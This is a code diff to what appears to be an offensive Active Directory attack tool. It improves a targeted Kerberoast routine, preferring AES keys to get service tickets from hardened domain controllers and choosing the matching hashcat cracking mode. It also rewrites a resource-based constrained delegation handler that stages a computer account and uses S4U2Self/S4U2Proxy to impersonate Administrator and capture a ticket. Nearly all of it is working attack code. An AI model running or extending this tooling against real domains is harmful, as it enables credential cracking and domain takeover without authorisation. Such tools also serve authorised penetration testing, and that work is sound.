@@ -62,6 +62,23 @@ from pathstrike.tools.netexec_wrapper import (
 # ===================================================================
 
 
+def _kerberoast_hashcat_mode(tgs_hashes: list[dict[str, Any]]) -> int:
+    """Return the hashcat mode for the captured TGS-REP hash(es).
+
+    The encryption type is encoded in the ``$krb5tgs$<etype>$`` prefix:
+    23 = RC4 (mode 13100), 18 = AES256 (19700), 17/19 = AES128 (19600).
+    Defaults to 13100 (RC4) when the etype can't be determined.
+    """
+    mode_by_etype = {"23": 13100, "18": 19700, "17": 19600, "19": 19600}
+    for entry in tgs_hashes:
+        h = entry.get("hash", "")
+        parts = h.split("$")
+        # "$krb5tgs$<etype>$..." -> parts = ['', 'krb5tgs', '<etype>', ...]
+        if len(parts) > 2 and parts[1] == "krb5tgs" and parts[2] in mode_by_etype:
+            return mode_by_etype[parts[2]]
+    return 13100
+
+
 async def perform_targeted_kerberoast(
     config: PathStrikeConfig,
     cred_store: CredentialStore,
@@ -132,20 +149,32 @@ async def perform_targeted_kerberoast(
         "Targeted Kerberoast on '%s': requesting TGS for '%s'",
         target_user, fake_spn,
     )
-    cred = cred_store.get_best_credential(source_principal, domain)
+    # Prefer the impacket tool-priority credential (AES key > NT hash).  This
+    # matters on hardened DCs that disable RC4: a TGS requested while
+    # authenticated with the NT (RC4) hash asks the KDC for an RC4 service
+    # ticket and is rejected with KDC_ERR_ETYPE_NOSUPP, so GetUserSPNs returns
+    # no hash even though the SPN write succeeded.  Authenticating with the AES
+    # key makes impacket request an AES service ticket (a $krb5tgs$18/19$ hash,
+    # still crackable), which the KDC will issue.  Falls back to NT hash /
+    # password when no AES key is held, so RC4-enabled environments are
+    # unaffected.
+    cred = cred_store.get_best_credential_for_tool(source_principal, domain, "impacket")
     password: str | None = None
     nt_hash: str | None = None
+    aes_key: str | None = None
     if cred is not None:
         if cred.cred_type == CredentialType.password:
             password = cred.value
         elif cred.cred_type == CredentialType.nt_hash:
             nt_hash = cred.value
-    if password is None and nt_hash is None:
+        elif cred.cred_type == CredentialType.aes_key:
+            aes_key = cred.value
+    if password is None and nt_hash is None and aes_key is None:
         password = config.credentials.password
         nt_hash = config.credentials.nt_hash
 
     imp_auth = build_impacket_auth(
-        domain, source_principal, password, nt_hash, dc_ip=dc_ip,
+        domain, source_principal, password, nt_hash, aes_key=aes_key, dc_ip=dc_ip,
     )
     # NB: ``kerberoast`` builds its own ``DOMAIN/user:password`` target
     # string internally, so we must forward password/nt_hash here as
@@ -224,15 +253,19 @@ async def perform_targeted_kerberoast(
             entry.get("spn", fake_spn),
             entry.get("hash", ""),
         )
+    # Pick the right hashcat mode from the ticket's etype: $krb5tgs$23$ = RC4
+    # (-m 13100), $18$ = AES256 (-m 19700), $17$/$19$ = AES128 (-m 19600).
+    # On RC4-disabled DCs the captured ticket is AES, so 13100 would be wrong.
+    hashcat_mode = _kerberoast_hashcat_mode(tgs_hashes)
     logger.info(
-        "Saved %d TGS hash(es) to %s — crack with `hashcat -m 13100 %s <wordlist>`",
-        len(tgs_hashes), hash_file, hash_file,
+        "Saved %d TGS hash(es) to %s — crack with `hashcat -m %d %s <wordlist>`",
+        len(tgs_hashes), hash_file, hashcat_mode, hash_file,
     )
 
     msg = (
         f"Targeted Kerberoast succeeded on '{target_user}' — "
         f"{len(tgs_hashes)} TGS hash(es) saved to {hash_file}. "
-        f"Crack offline (hashcat -m 13100) then re-run with the "
+        f"Crack offline (hashcat -m {hashcat_mode}) then re-run with the "
         f"recovered password."
     )
     return (True, msg, [], leftover_spn)
@@ -593,143 +626,54 @@ class AddAllowedToActHandler(BaseEdgeHandler):
     async def exploit(
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
-        target_computer = self._resolve_target(edge)
         source_user = self._resolve_principal(edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
-
-        # Determine the machine account to use for RBCD
-        # The source may be a computer account, or we need to create/use one
-        machine_account = edge.source.properties.get(
-            "machine_account", f"{source_user}$"
-        )
-        self._machine_account = machine_account
+        target_fqdn = edge.target.name.split("@")[0]
+        target_short = target_fqdn.split(".")[0]
+        target_sam = target_short if target_short.endswith("$") else f"{target_short}$"
+        spn = f"cifs/{target_fqdn}"
+        write_auth = self._get_auth_args(source_user)
 
         if dry_run:
             return (
                 True,
-                f"[DRY RUN] Would set RBCD from '{machine_account}' to "
-                f"'{target_computer}', then S4U to impersonate admin.",
+                f"[DRY RUN] Would stage a controlled computer, write RBCD on "
+                f"'{target_sam}', S4U2Self+S4U2Proxy to '{spn}' impersonating "
+                "Administrator, then clean up the staged RBCD + computer.",
                 [],
             )
 
-        # Step 1: Set RBCD
-        self.logger.info(
-            "AddAllowedToAct Step 1: Setting RBCD from '%s' to '%s'",
-            machine_account, target_computer,
+        # Stage a fresh computer (it has an SPN, so it can S4U2Self), point the
+        # target's RBCD at it, S4U as the staged account, then tear it all down.
+        # The old approach assumed "<source>$" already existed with creds, which
+        # fails whenever the source is a user.
+        ok, msg, ccache = await self._rbcd_via_staged_computer(
+            rbcd_target_sam=target_sam, s4u_spn=spn, impersonate="Administrator",
+            domain=domain, dc_ip=dc_host, write_auth=write_auth,
         )
-        rbcd_result = await set_rbcd(
-            self.config, auth_args, target_computer, machine_account
-        )
-
-        if not rbcd_result["success"]:
-            return (
-                False,
-                f"RBCD setup failed: {rbcd_result.get('error', 'unknown')}",
-                [],
-            )
-
-        # Step 2: S4U2Self + S4U2Proxy to get service ticket
-        spn = f"cifs/{target_computer}"
-        if "." not in target_computer:
-            # Try FQDN from edge properties
-            fqdn = edge.target.properties.get("fqdn", f"{target_computer}.{domain}")
-            spn = f"cifs/{fqdn}"
-
-        self.logger.info(
-            "AddAllowedToAct Step 2: S4U2Proxy as '%s' -> impersonate Administrator "
-            "for SPN='%s'",
-            machine_account, spn,
-        )
-
-        # Extract machine account credentials
-        machine_user = machine_account.rstrip("$")
-        cfg = self.config.credentials
-        cred = self.cred_store.get_best_credential(machine_user, domain)
-
-        password = None
-        nt_hash = None
-        if cred:
-            if cred.cred_type == CredentialType.password:
-                password = cred.value
-            elif cred.cred_type == CredentialType.nt_hash:
-                nt_hash = cred.value
-        else:
-            password = cfg.password
-            nt_hash = cfg.nt_hash
-
-        from pathstrike.tools.impacket_wrapper import build_impacket_auth
-
-        imp_auth = build_impacket_auth(
-            domain, machine_user, password, nt_hash, dc_ip=dc_host
-        )
-
-        st_result = await get_st(
-            spn=spn,
-            impersonate="Administrator",
-            auth_args=imp_auth,
-            domain=domain,
-            username=machine_user,
-            password=password,
-            nt_hash=nt_hash,
-            dc_ip=dc_host,
-        )
-
-        if not st_result["success"]:
-            return (
-                False,
-                f"S4U failed: {st_result.get('error', 'unknown')}. "
-                "RBCD was set and should be rolled back.",
-                [],
-            )
-
-        # Infer the ccache path from Impacket's output
-        ccache_path = "Administrator.ccache"
-        output = st_result.get("output", "")
-        ccache_match = re.search(r"Saving ticket in (.+\.ccache)", output)
-        if ccache_match:
-            ccache_path = ccache_match.group(1)
+        if not ok:
+            return False, msg, []
 
         new_creds: list[Credential] = []
-        ccache_cred = Credential(
-            cred_type=CredentialType.ccache,
-            value=ccache_path,
-            username="Administrator",
-            domain=domain,
-            obtained_from=f"rbcd:{machine_account}->{target_computer}",
-            obtained_at=datetime.now(timezone.utc),
-        )
-        new_creds.append(ccache_cred)
-        self.cred_store.add_credential(ccache_cred)
-
-        msg = (
-            f"RBCD exploitation succeeded. Service ticket for Administrator "
-            f"to '{spn}' saved at: {ccache_path}"
-        )
+        if ccache:
+            ccache_cred = Credential(
+                cred_type=CredentialType.ccache,
+                value=ccache,
+                username="Administrator",
+                domain=domain,
+                obtained_from=f"rbcd:AddAllowedToAct->{target_sam}",
+                obtained_at=datetime.now(timezone.utc),
+            )
+            new_creds.append(ccache_cred)
+            self.cred_store.add_credential(ccache_cred)
         self.logger.info(msg)
         return (True, msg, new_creds)
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
-        target_computer = self._resolve_target(edge)
-        dc_host = self._get_dc_host()
-        domain = self._get_domain()
-        machine_account = self._machine_account or "UNKNOWN$"
-
-        # Rollback commands omit --host/-d/--dc-ip — the RollbackManager
-        # injects connection and auth args automatically for bloodyAD commands.
-        return RollbackAction(
-            step_index=0,
-            action_type="remove_rbcd",
-            description=(
-                f"Remove RBCD delegation from '{machine_account}' "
-                f"on '{target_computer}'"
-            ),
-            command=(
-                f"bloodyAD remove rbcd {target_computer} {machine_account}"
-            ),
-            reversible=True,
-        )
+        # The staged RBCD entry and computer account are removed inline by
+        # _rbcd_via_staged_computer, so there is nothing left to roll back.
+        return None
 
 
 # ===================================================================
